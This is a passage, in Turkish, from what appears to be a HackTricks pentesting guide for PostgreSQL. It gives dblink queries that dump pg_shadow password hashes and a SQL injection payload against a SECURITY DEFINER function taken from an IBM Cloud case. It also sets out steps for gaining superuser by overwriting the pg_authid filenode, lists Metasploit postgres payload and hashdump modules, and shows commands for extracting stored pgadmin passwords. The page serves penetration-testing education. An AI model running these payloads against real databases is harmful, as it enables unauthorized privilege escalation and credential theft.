Önceki sorgunun çalışması için **`dblink` fonksiyonunun var olması gerektiğini unutmayın**. Eğer yoksa aşağıdaki komutu kullanarak oluşturabilirsiniz:
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

Eğer daha fazla ayrıcalığa sahip bir kullanıcının şifresine sahipseniz, ancak kullanıcının harici bir IP'den giriş yapmasına izin verilmiyorsa, aşağıdaki işlevi kullanarak o kullanıcı olarak sorguları yürütebilirsiniz:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Bu işlevin var olup olmadığını kontrol etmek mümkündür:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Güvenlik Tanımlayıcısı ile** özel tanımlı işlev

[**Bu yazıda**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesterlar, IBM tarafından sağlanan bir postgres örneğinde **bu işlevi buldukları için** içeride bir ayrıcalık yükseltme yapabildiler:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

[**Belgelerde açıklandığı gibi**](https://www.postgresql.org/docs/current/sql-createfunction.html) **SECURITY DEFINER ile** bir işlev, **sahibi olan kullanıcının ayrıcalıklarıyla** yürütülür. Bu nedenle, işlev **SQL Injection'a duyarlı ise** veya **saldırgan tarafından kontrol edilen parametrelerle ayrıcalıklı işlemler yapıyorsa**, postgres içinde **ayrıcalıkları yükseltmek için kötüye kullanılabilir**.

Önceki kodun 4. satırında işlevin **SECURITY DEFINER** bayrağı olduğunu görebilirsiniz.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
Ve sonra **komutları çalıştır**:

<figure><img src="../.gitbook/assets/image (649).png" alt=""><figcaption></figcaption></figure>

### PL/pgSQL ile Brute Force Geçişi

**PL/pgSQL**, SQL'e kıyasla daha fazla prosedürel kontrol sunan **tam özellikli bir programlama dilidir**. Program mantığını geliştirmek için **döngüler** ve diğer **kontrol yapıları** kullanımını sağlar. Ayrıca, **SQL ifadeleri** ve **tetikleyiciler**, **PL/pgSQL dilini** kullanarak oluşturulan fonksiyonları çağırma yeteneğine sahiptir. Bu entegrasyon, veritabanı programlaması ve otomasyonuna daha kapsamlı ve esnek bir yaklaşım sağlar.\
**Bu dilin kötüye kullanımıyla PostgreSQL'den kullanıcı kimlik bilgilerini brute force yapmasını isteyebilirsiniz.**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

### Dahili PostgreSQL Tablolarını Üzerine Yazarak İstek Yükseltme

{% hint style="info" %}
Aşağıdaki istek yükseltme vektörü, tüm adımların iç içe geçmiş SELECT ifadeleri aracılığıyla gerçekleştirilebileceği sınırlı SQLi bağlamlarında özellikle kullanışlıdır.
{% endhint %}

Eğer **PostgreSQL sunucu dosyalarını okuyup yazabiliyorsanız**, PostgreSQL üzerindeki diskteki dosya düğümünü, dahili `pg_authid` tablosu ile ilişkilendirilmiş olanı üzerine yazarak **süper kullanıcı olabilirsiniz**.

Bu tekniğe daha fazla bilgi için [**buraya**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)** bakın.**

Saldırı adımları şunlardır:

1. PostgreSQL veri dizinini elde et
2. `pg_authid` tablosu ile ilişkilendirilmiş dosya düğümüne göre göreceli bir yol elde et
3. `lo_*` fonksiyonları aracılığıyla dosya düğümünü indir
4. `pg_authid` tablosu ile ilişkilendirilmiş veri türünü al
5. [PostgreSQL Dosya Düğümü Düzenleyici](https://github.com/adeadfed/postgresql-filenode-editor)'yi kullanarak [dosya düğümünü düzenle](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg\_authid-table); tüm `rol*` boolean bayraklarını 1 olarak ayarla ve tam izinler ver.
6. Düzenlenmiş dosya düğümünü `lo_*` fonksiyonları aracılığıyla yeniden yükle ve diskteki orijinal dosyayı üzerine yaz
7. _(İsteğe bağlı olarak)_ Pahalı bir SQL sorgusunu çalıştırarak bellek içi tablo önbelleğini temizle
8. Artık tam bir süper yönetici ayrıcalıklarına sahip olmalısınız.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### günlüğe kaydetme

_**postgresql.conf**_ dosyası içinde postgresql günlüklerini etkinleştirebilirsiniz, değiştirerek:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Sonra, **hizmeti yeniden başlatın**.

### pgadmin

[pgadmin](https://www.pgadmin.org), PostgreSQL için bir yönetim ve geliştirme platformudur.\
Parolaları _**pgadmin4.db**_ dosyasının içinde bulabilirsiniz.\
Onları şu betik içindeki _**decrypt**_ işlevini kullanarak şifreleyebilirsiniz: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

PostgreSQL'de istemci kimlik doğrulaması **pg\_hba.conf** adlı bir yapılandırma dosyası aracılığıyla yönetilir. Bu dosya, her biri bir bağlantı türünü, istemci IP adresi aralığını (uygulanabilirse), veritabanı adını, kullanıcı adını ve eşleşen bağlantılar için kullanılacak kimlik doğrulama yöntemini belirten bir dizi kayıt içerir. Bağlantı türü, istemci adresi, istenen veritabanı ve kullanıcı adıyla eşleşen ilk kayıt kimlik doğrulaması için kullanılır. Kimlik doğrulaması başarısız olursa geriye dönüş veya yedek yoktur. Eşleşen kayıt yoksa erişim reddedilir.

pg\_hba.conf'daki mevcut şifre tabanlı kimlik doğrulama yöntemleri **md5**, **crypt** ve **password**'dur. Bu yöntemler, şifrenin nasıl iletildiğinde farklılık gösterir: MD5-hashed, crypt-encrypted veya açık metin. Önemli bir not olarak, crypt yöntemi pg\_authid'de şifrelenmiş şifrelerle kullanılamaz.

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katılın veya** bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=pentesting-postgresql) kullanarak dünyanın **en gelişmiş** topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pentesting-postgresql" %}
